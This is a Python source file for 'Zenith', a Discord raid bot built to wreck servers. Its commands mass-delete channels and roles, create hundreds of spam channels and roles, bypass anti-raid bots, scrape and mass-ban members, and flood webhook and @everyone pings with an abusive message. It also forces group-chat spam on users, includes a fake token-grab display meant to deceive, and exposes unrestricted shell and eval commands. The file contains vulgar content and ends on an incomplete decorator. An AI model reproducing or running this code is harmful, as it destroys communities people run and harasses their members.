#!/usr/bin/python
# -*- coding: utf-8 -*-

##### === MODULES === #####

try:
    import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, datetime, threading, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process
except:
    import os
    os.system('pip install discord')
    os.system('pip install aioconsole')
    os.system('pip install httpx')
    os.system('pip install colorama')
    import discord, random, json, aiohttp, aioconsole, httpx, asyncio, time, string, base64, os, io, contextlib, textwrap, datetime, threading, requests as rq; from discord.ext import commands; from traceback import format_exception; from colorama import Fore; from threading import Thread; from multiprocessing import Process

##### === KEEPALIVE === #####

from flask import Flask

app = Flask('')

@app.route('/')
def main():
  return "Your Bot Is Ready"

def run():
  app.run(host="0.0.0.0", port=8000)

def keep_alive():
  server = Thread(target=run)
  server.start()

##### === VARIABLES === #####

idlist = ['921402637214162946']
token = os.environ.get('TOKEN')
prefix = 'z!'
msg = '@everyone ZENITH FUCKED YOU ALL ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||'
global hook
hook = False

languages = {'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese, Japan', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}
locales = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']
zenith_fonts = ['ℨ𝔢𝔫𝔦𝔱𝔥', '𝖅𝖊𝖓𝖎𝖙𝖍', '𝓩𝓮𝓷𝓲𝓽𝓱', '𝒵𝑒𝓃𝒾𝓉𝒽', 'ℤ𝕖𝕟𝕚𝕥𝕙', 'Ｚｅｎｉｔｈ', 'ɥʇıuǝZ', 'Zҽɳιƚԋ', 'ፚᏋᏁᎥᏖᏂ', '𝐙𝐞𝐧𝐢𝐭𝐡', '𝗭𝗲𝗻𝗶𝘁𝗵', '𝘡𝘦𝘯𝘪𝘵𝘩', '𝙕𝙚𝙣𝙞𝙩𝙝', '𝚉𝚎𝚗𝚒𝚝𝚑', '乙乇几丨ㄒ卄', 'ᗱᘿᘉᓰᖶᕼ', '𝐙𝕖ℕιŦｈ', '𝔃ⓔｎĮⓣｈ', '乙έⓃᎥｔĦ']


intents = discord.Intents.all()
client = commands.Bot(command_prefix = prefix, intents=intents, self_bot=False)
client.remove_command('help')
headers = {
  'Authorization':f'{token}',
}
requests = rq.Session()

wh = W = Fore.WHITE
bl = DB = Fore.LIGHTBLACK_EX
rs = RE = Fore.RESET

##### === ON-READY === #####

cToken = token[:25] + "*"*34

@client.event
async def on_ready():
  os.system('clear')
  print(f'''

{bl}       ████████╗         ┏━━━━━━━━━━━━━━━━━━ Info ━━━━━━━━━━━━━━━━┓
{bl}      ██████████╗           {wh}[Prefix] ⧉ {bl}➜ {rs}{str(client.command_prefix)}
{bl}      ██║ ██  ██║           {wh}[On-set] ⧉ {bl}➜ {rs}{client.user.name}#{client.user.discriminator}
{bl}      ████  ████║           {wh}[Client] ⧉ {bl}➜ {rs}{cToken}
{bl}      ╚████████╔╝           {wh}[Status] ⧉ {bl}➜ {rs}Operational! 100%
{bl}       █═█═█═█═╝         ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
''')
  print('[+] ')

##### === FUNCTIONS === #####

def asciigen(length):
    asc = ""
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def chunks(l, n):
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))

def get_channels(session):
    tasks = []
    for ch in channels:
      tasks.append(session.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers))
    return tasks

def get_roles(session):
    tasks = []
    for role in roles:
      tasks.append(session.delete(f"https://discord.com/api/v9/guilds/{guild2}/roles/{role}", headers=headers))
    return tasks

def make_channels(session):
    tasks = []
    for i in range(200):
        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':f'nuked-by-{random.choices(zenith_fonts)}'}))
    return tasks

def make_roles(session):
    tasks = []
    for i in range(100):
        name = 'ZENITH X ZENITH'
        payload = {
          'color': 10038562,
          'name':name,
        }
        tasks.append(session.post(f'https://discord.com/api/v9/guilds/{guild2}/roles', headers=headers, json=payload))
    return tasks

async def delroles():
    async with httpx.AsyncClient() as session:
        tasks = get_roles(session)
        await asyncio.gather(*tasks)

async def delchannels():
    async with httpx.AsyncClient() as session:
        tasks = get_channels(session)
        await asyncio.gather(*tasks)

async def bombchannels():
  async with httpx.AsyncClient() as session:
      tasks = make_channels(session)
      await asyncio.gather(*tasks)

async def rolebomb():
  async with httpx.AsyncClient() as session:
    tasks = make_roles(session)
    await asyncio.gather(*tasks)

async def deletech(ch, session):
  while True:
    rq = await session.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers)
    if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    else:
        break

async def whsend(link, session, message):
  data = {"content": f'{message}'}
  while True:
    async with await session.post(link, json=data, headers={'Content-Type':"application/json"}) as r:
      if r.status_code == 429:
        json = await r.json()
        await asyncio.sleep(json['retry_after'])
      else:
        break

async def baan(guild, id, session):
  while True:
    rq = await session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{id}", headers=headers)
    if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    else:
        #logging.info(f'Executed {id}')
        break
  print(rq.status_code)


async def makech(name, session):
  while True:
    async with await session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':name}) as a:
      if a.status_code == 429:
        json = await a.json() 
        await asyncio.sleep(json['retry_after'])
      else:
        break

c1 = {
    "description": None,
    "features": ["NEWS"],
    "preferred_locale": "en-US",
    "rules_channel_id": None,
    "public_updates_channel_id": None
}

c2 = {
    "features": ["COMMUNITY"],
    "preferred_locale": "en-US",
    "rules_channel_id": "1",
    "public_updates_channel_id": "1"
}

async def comflood(gid, session):
    while True:
        try:
            async with await session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{gid}", headers=headers, json=c2) as a:
                s = [200, 201, 204]
                if a.status_code in s:
                    print("Created community")
                elif a.status_code == 429:
                    x = a.json()
                    print(f"Rate limited, retrying in {x['retry_after']} seconds")
                    time.sleep(x['retry_after'])
        except:
            pass
        try:  
            async with await session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{gid}", headers=headers, json=c1) as a:
                s = [200, 201, 204]
                if a.status_code in s:
                    print("Disabled community")
                elif a.status_code == 429:
                    x = a.json()
                    print(f"Rate limited, retrying in {x['retry_after']} seconds")
                    time.sleep(x['retry_after'])
        except:
            pass

##### === COMMANDS: HELP === #####

@client.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category == None:
        await ctx.send(f'''
>>> ```ini
•✧• ══ [ZENITH ❖ MAIN] ══ •✧•
Zenith ✧ 12.5 ✧ {client.command_prefix}

╭───────────── •  •  • [ ZENITH ]
help raid  ; shows raid panel
help misc  ; shows misc panel
help info  ; shows info panel
help load  ; shows load panel
╰───────────── •  • 
```
        ''')
    if category == 'raid':
        await ctx.send(f'''
>>> ```ini
•✧• ══ [ZENITH ❖ RAID] ══ •✧•
Zenith ✧ 12.5 ✧ {client.command_prefix}

╭───────────── •  •  • [ ZENITH ]
nuke       ; nuke w/ wick bypass
nuke2      ; nuke w/o wick bypass
community  ; nuke w/o audit (takaso)
chdel      ; del channels
chbomb     ; spam channels 
rolenuke   ; nuke roles
nicknuke   ; nuke names
webhook    ; <on/off> enable pings
scrape     ; scrapes membs
massban    ; ban scraped membs
╰───────────── •  • 
```
        ''')
    elif category == 'misc':
        await ctx.send(f'''
>>> ```ini
•✧• ══ [ZENITH ❖ MISC] ══ •✧•
Zenith ✧ 12.5 ✧ {client.command_prefix}

╭───────────── •  •  • [ ZENITH ]
manual     ; ping roles/everyone
massgc     ; <int> <user> mass gc 
spamgc     ; <int> <name> change gc name
purge      ; <int> purges messages
firstmsg   ; sends link to first message
ping       ; gets bot latency
status     ; <on/off/idle/dnd> enable status
otax       ; <user> get user token
ghost      ; <msg> sends and delete
spam       ; <int> <msg>
unbanall   ; unban everyone
clone      ; clone and delete channel
cum        ; cum.
╰───────────── •  • 
```
        ''')
    elif category == 'info':
        await ctx.send(f'''
>>> ```ini
•✧• ══ [ZENITH ❖ INFO] ══ •✧•
Zenith ✧ 12.5 ✧ {client.command_prefix}

╭───────────── •  •  • 
bash       ; <code> bash emulator
eval       ; <code> py emulator
base64     ; <encode/decode> <msg>
pingweb    ; <url> ping url / return status
guildicon  ; get guild icon
banner     ; get guild banner
roleslist  ; get guild roles
╰───────────── •  • 
```
        ''')
    
    elif category == 'load':
        await ctx.send(f'''
>>> ```ini
•✧• ══ [ZENITH ❖ LOAD] ══ •✧•
Zenith ✧ 12.5 ✧ {client.command_prefix}

╭───────────── •  •  • [ ZENITH ]
guildload  ; <list/...> load server
copyguild  ; clone guild
╰───────────── •  • 
```
        ''')

##### === COMMANDS: RAID === #####

channels = []
@client.command()
async def chdel(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for channel in list(guild.channels):
    channels.append(channel.id)
  try:
    await delchannels()
  except Exception as e:
    print(f'{e}')

channels = []
@client.command()
async def chdel2(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as session:
    tasks = []
    for ch in ctx.guild.channels:
      tasks.append(asyncio.create_task(deletech(ch.id, session)))
    await asyncio.gather(*tasks)

@client.command()
async def chbomb(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  try:
    await bombchannels()
  except Exception as e:
    print(f'{e}')


@client.command()
async def chbomb2(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  async with httpx.AsyncClient() as session:
    tasks = []
    for i in range(200):
      tasks.append(asyncio.create_task(makech(f'nuked-by-{random.choice(zenith_fonts)}', session)))
    await asyncio.gather(*tasks)

@client.command()
async def community(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  async with httpx.AsyncClient() as session:
    tasks = []
    for i in range(200):
      tasks.append(asyncio.create_task(comflood(guild2, session)))
    await asyncio.gather(*tasks)

@client.command()
async def webhook(ctx, arg):
  global hook
  try:
    await ctx.message.delete()
  except:
    pass
  if arg == 'on' or arg == 'On':
    if hook:
      await ctx.send('[ZENITH] | Webhook Pings already turned on!', delete_after=3)
    else:
      hook = True
      await ctx.send('[ZENITH] | Webhook Pings successfully turned on!', delete_after=3)
  if arg == 'off' or arg == 'Off':
    if hook == False:
      await ctx.send('[ZENITH] | Webhook Pings already turned off!', delete_after=3)
    else:
      hook = False
      await ctx.send('[ZENITH] | Webhook Pings successfully turned off!', delete_after=3)

roles = []
@client.command()
async def roledel(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for role in list(guild.roles):
    roles.append(role.id)
  try:
    await delroles()
  except Exception as e:
    print(f'{e}')

@client.command()
async def rolenuke(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  await roledel(ctx)

@client.command(aliases=['scrape'])
async def scrapemembs(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  global members2
  guild = ctx.guild
  members2 = await guild.chunk()
  global members
  members = []
  for member in members2:
    members.append(member.id)
  members.remove(ctx.author.id)
  await ctx.send(f'Scraped {len(members)} members!', delete_after=3)

@client.command()
async def massban(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as client:
    for i in chunks(members, 50):
      tasks = []
      for user in i:
        tasks.append(asyncio.create_task(baan(ctx.guild.id, user,client)))
      await asyncio.gather(*tasks)

@client.command()
async def hookping(ctx, amount:int):
  await ctx.message.delete()
  tasks = []
  async with httpx.AsyncClient() as session:
    for i in range(amount):
      for w in await ctx.guild.webhooks():
        try:
          tasks.append(whsend(w.url, session, '@everyone [ZENITH] | ZENITH RUNS YOU'))
        except:
          pass
    await asyncio.gather(*tasks)

@client.command()
async def nicknuke(ctx):
  await ctx.message.delete()
  members = await ctx.guild.chunk()
  for member in members:
      try:
          await member.edit(nick='〖ZENITH〗')
      except:
          pass

@client.command()
async def webhooknuke(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    try:
      await c.create_webhook(name ="〖ZENITH〗")
    except:
      pass

@client.event
async def on_guild_channel_create(channel):
  global hook
  if hook == True:
    webhook = await channel.create_webhook(name="ZENITH X ZENITH")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            await webhook.send(f"{msg}")

@client.command(aliases=['kill'])
async def nuke(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  await roledel(ctx)
  await chdel(ctx)
  await chbomb(ctx)

@client.command(aliases=['kill2'])
async def nuke2(ctx, name=None):
  if name==None:
    name = 'ZENITH X VA'
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for channel in list(guild.channels):
    channels.append(channel.id)
  await chdel2(ctx)
  await chbomb2(ctx)

##### === COMMANDS: MISC === #####

@client.command()
async def manual(ctx):
  await ctx.message.delete()
  count = 0
  roles = []
  for role in ctx.guild.roles:
    if role.name == '@everyone':
      pass
    else:
      roles.append(f'<@&{role.id}>')
  for c in ctx.guild.channels:
    for i in range(50):
      count += 1
      await ctx.send('**@everyone 〖ZENITH X ZENITH〗** ' + f' '.join([random.choice(roles) for i in range(5)]) + f' | {count}')

@client.command(aliases=['massgc', 'mass-gc'])
async def massaddgc(ctx, amount=int, *, user: discord.User = None):
        await ctx.message.delete()
        if user is None:
            await ctx.send('''
> ```ini
> [ZENITH] ERROR! | User cannot be 'None'
> ```
                        ''')
            return
        for friend in client.user.friends:
            if friend == user:
              continue
            for _i in range(amount):
                async with aiohttp.ClientSession() as session:
                  async with session.post(f"https://discord.com/api/v9/users/@me/channels", headers={'authorization':f'{token}','Content-type':'application/json'}, json={'recipients':[f'{user.id}',f'{friend.id}']}) as resp:
                    if resp.status == 200:
                        await ctx.send('''
> ```ini
> [ZENITH] GC Made
> ```
                        ''')
                        c = await resp.json()
                        channel = c['id']
                        async with session.delete(f'https://discord.com/api/v9/channels/{channel}', headers={'authorization':f'{token}','Content-type':'application/json'}) as resp:
                            if resp.status == 200:
                                await ctx.send('''
> ```ini
> [ZENITH] Left GC
> ```
                        ''')                            
                    if resp.status == 403:
                        await ctx.send('''
> ```ini
> [ZENITH] Unauthorized
> ```
                        ''')
                    if resp.status == 429 or resp.status == 400:
                        k = await resp.json()
                        await ctx.send(f'''
> ```ini
> [ZENITH] {resp.status} You are being ratelimited, wait after {k['retry_after']}
> ```
                        ''')
                        await asyncio.sleep(k['retry_after'])
                        break #currently like this till proxy support
                    else:
                        print(resp.status)

@client.command(aliases=["spam-groupchat", "spamgroupchat"])
async def spamgc(ctx,amount: int, *, args):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for _i in range(amount):
          name = args + ' | ' + ''.join(random.choice(string.ascii_letters) for i in range(1)) 
          await ctx.message.channel.edit(name=name)

@client.command(aliases=["jerkoff", "ejaculate", "orgasm"]) # from exeter
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@client.command()
async def massreact(ctx, amount, *, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=amount).flatten()
    for message in messages:
        await message.add_reaction(emote)

@client.command()
async def vcspam(ctx, ch1=None, ch2=None, uid=None, amount=10):
    if ch1==None or ch2==None:
        await ctx.message.edit(content = f"**Usage:** `vcspam [ch1] [ch2] <uid> <amount>` ")  
    else:
        await ctx.message.delete()
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        for _i in range(int(amount)):
            requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{uid}",headers=headers,json={"channel_id": ch1})
            data = requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{uid}",headers=headers,json={"channel_id": ch2}).text
            if "rate limited" in data.lower(): 
                try:
                    j = json.loads(data)
                    r = j['retry_after']
                    w = r / 1000
                    await asyncio.sleep(w)
                except:
                    await asyncio.sleep(5)

@client.command(aliases=['mass-unban', "purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@client.command(aliases=['base64'])
async def b64(ctx, tp, *, strng):
  if tp == 'encode':
    message_bytes = strng.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    await ctx.send(f'```ini\n[{strng}]\n{base64_bytes}```')
  if tp == 'decode':
    base64_bytes = strng.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    await ctx.send(f'```ini\n[{strng}]\n{message}```')

@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(
            lambda m: m.author == client.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass

@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    await ctx.send(f'''
Content: {first_message.content}
Jump: {first_message.jump_url}
    ''')

@client.command()
async def ping(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  before = time.monotonic()
  message = await ctx.send("Pinging...")
  ping = (time.monotonic() - before) * 1000
  await message.edit(content=f"> `{int(ping)} ms`")

@client.command()
async def status_code(ctx, status_code=None):
  try:
    await ctx.message.delete()
  except:
    pass
  if status_code == None:
    await ctx.send('You need to specify a status_code!', delete_after=2)
  if status_code == 'idle':
    await client.change_presence(status_code=discord.status_code.idle)
    await ctx.send('Finished! | 🌙')
  if status_code == 'dnd':
    await client.change_presence(status_code=discord.status_code.dnd)
    await ctx.send('Finished! | ⛔')
  if status_code == 'off':
    await client.change_presence(status_code=discord.status_code.offline)
    await ctx.send('Finished! | ⚫')
  if status_code == 'on' or status_code == 'online':
    await client.change_presence(status_code=discord.status_code.online)
    await ctx.send('Finished! | 🟢')

@client.command(aliases=['otacks', 'tokengrab', 'tg', 'otax'])
async def _tokengrab(ctx, *, user: discord.User=None):
        await ctx.message.delete()
        if not user:
            user = ctx.author
        userid=str(user.id)
        encodedBytes = base64.b64encode(str(userid).encode("utf-8"))
        encodedid = str(encodedBytes, "utf-8")
        username = user.display_name
        discrim = user.discriminator
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
        middle = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))

        await ctx.send(f'''
>>> ```ini
[ TOKEN DECODER - FETCHED TOKEN ]
```
```diff
- {username}#{discrim} | 1st Part | Base64 : {encodedid}
- {username}#{discrim} | 2nd Part | Unix   : {middle}
- {username}#{discrim} | 3rd Part | HMAC   : {end}
+ {username}#{discrim} | Full Token        : {encodedid}.{middle}.{end}
```
        ''')

@client.command()
async def ghost(ctx, *, msg):
  await ctx.message.delete()
  x = await ctx.send(msg)
  await x.delete()

@client.command(aliases=['spam'])
async def s(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@client.command()
async def clone(ctx):
  await ctx.message.delete()
  x = await ctx.channel.clone(reason='')
  await ctx.channel.delete()
  await x.send("""
>>> ```ini
 [ CHANNEL HAS BEEN CLONED ]
```""")

##### === COMMANDS: INFO === #####

@client.command(aliases=["vclag", "changeregion", "regionschange"])
async def regionspam(self, session, channel):
        vc = f"https://discord.com/api/v9/channels/{channel}"
        region = [
            'hongkong',
            'europe',
            'brazil',
            'us-central',
            'us-east',
            'sydney',
            'russia',
            'india',
            'japan',
            'us-west',
            'us-south',
            'singapore'
        ]
        rgc = random.choice(region)
        payload = {
            'rtc_region': str(rgc)
        }
        async with session.patch(vc, headers={'authorization':self.token}, json=payload) as req:
            if req.status == 200:
                await aioconsole.aprint(f"{req.status} - Changed region to {rgc}")
            if req.status == 429:
                k = await req.json()
                await aioconsole.aprint(f"{req.status} You are being ratelimited, wait after {k['retry_after']}")
                await asyncio.sleep(k['retry_after'])

@client.command(aliases=['servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    await ctx.send(ctx.guild.icon_url)

@client.command(aliases=['serverbanner'])
async def guildbanner(ctx):
    await ctx.message.delete()
    await ctx.send(ctx.guild.banner_url)

@client.command(aliases=['pw'])
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            await ctx.send(f'Exception: {e}')
        await ctx.send(f'Pinged `{website}`, [{r}]')

@client.command(aliases=['get-roles', 'cr', 'copy-roles', 'getroles', 'copyroles'])
async def gr(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)


def clean_code(content):
        if content.startswith("```") and content.endswith("```"):
            return "\n".join(content.split("\n")[1:])[:-3]
        else:
            return content

@client.command(aliases=['eval'])
async def _eval(ctx, *, code):
        stdout = io.StringIO()
        code = clean_code(code)

        local_variables = {
            "discord": discord,
            "commands": commands,
            "client": client,
            "ctx": ctx,
            "channel": ctx.channel,
            "author": ctx.author,
            "guild": ctx.guild,
            "message": ctx.message
        }

        stdout = io.StringIO()

        try:
            with contextlib.redirect_stdout(stdout):
                exec(
                    f"async def func():\n{textwrap.indent(code, '    ')}", local_variables,
                )

                obj = await local_variables["func"]()
                result = f"{stdout.getvalue()}\n-- {obj}\n"

        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        except:
          pass

        await ctx.send(f"**Code Input**\n```py\n{code}\n```\n\n**Code Output**\n```bash\n{result}\n```")

@client.command()
async def bash(ctx ,* args):
    try:
        await ctx.message.delete()
    except:
        pass
    cmd, arg = ctx.message.content.split(' ', 1)
    args = arg.split(' ', len(args))
    args = ' '.join(args[0:(len(args))])
    try:
        process = await asyncio.create_subprocess_shell(args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
    except Exception as e:
        await ctx.channel.send(f'```bash\n{e}```')
        print(e)
    if stdout:
        try:
            await ctx.channel.send(f'Shell STDOUT: `$ {args}` ({process.pid}) exited with return code: {process.returncode}')
            await ctx.channel.send(f"```bash\n{stdout.decode()}\n```")
            return
        except discord.errors.HTTPException as e:
            if e.code == 50035:
                try:
                    with open('./data/bash_output.txt', 'w') as file:
                        file.write(f'{stdout.decode()}')
                    out = discord.File('./data/bash_output.txt')
                    try:
                        await ctx.channel.send(file=out)
                        return
                    except Exception as e:
                        await ctx.channel.send(e)
                        return
                except Exception as e:
                    await ctx.channel.send(e)
                    return
    elif stderr:
        try:
            await ctx.channel.send(f'Shell STDERR: `$ {args}` ({process.pid}) exited with return code: {process.returncode}')
            await ctx.channel.send(f"```\n{stderr.decode()}```")
            return
        except discord.errors.HTTPException as e:
            if e.code == 50035:
                try:
                    with open('bash_output.txt', 'w') as file:
                        file.write(f'{stdout.decode()}')
                    out = discord.File('bash_output.txt')
                    try:
                        await ctx.channel.send(file=out)
                        return
                    except Exception as e:
                        await ctx.channel.send(e)
                        return
                except Exception as e:
                    await ctx.channel.send(e)
                    return
    else:
        await ctx.channel.send(f'Command: `$ {args}` ({process.pid}) exited with return code {process.returncode}')
        return

##### === BACKUP === #####

@client.command(aliases=["copyguild", "copyserver"])
async def copy(ctx):  
    await ctx.message.delete()
    await client.create_guild(f'COPY OF {ctx.guild.name}')
    await ctx.send('Backup starting in 2 seconds...')
    await asyncio.sleep(2)
    for g in client.guilds:
        if f'COPY OF {ctx.guild.name}' in g.name:
            for chn in g.channels:
                await chn.delete()
            for cat in ctx.guild.categories:
                x = await g.create_category(f"{cat.name}", overwrites=cat.overwrites)
                for c in cat.channels:
                    if isinstance(c, discord.VoiceChannel):
                        await x.create_voice_channel(f"{c}", overwrites=c.overwrites)
                    if isinstance(c, discord.TextChannel):
                        await x.create_text_channel(f"{c}", overwrites=c.overwrites, topic=c.topic)
            for role in ctx.guild.roles:
              if role.name == '@everyone':
                pass
              else:
                await g.create_role(name=role.name, color=role.color, permissions=role.permissions)
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@client.command()
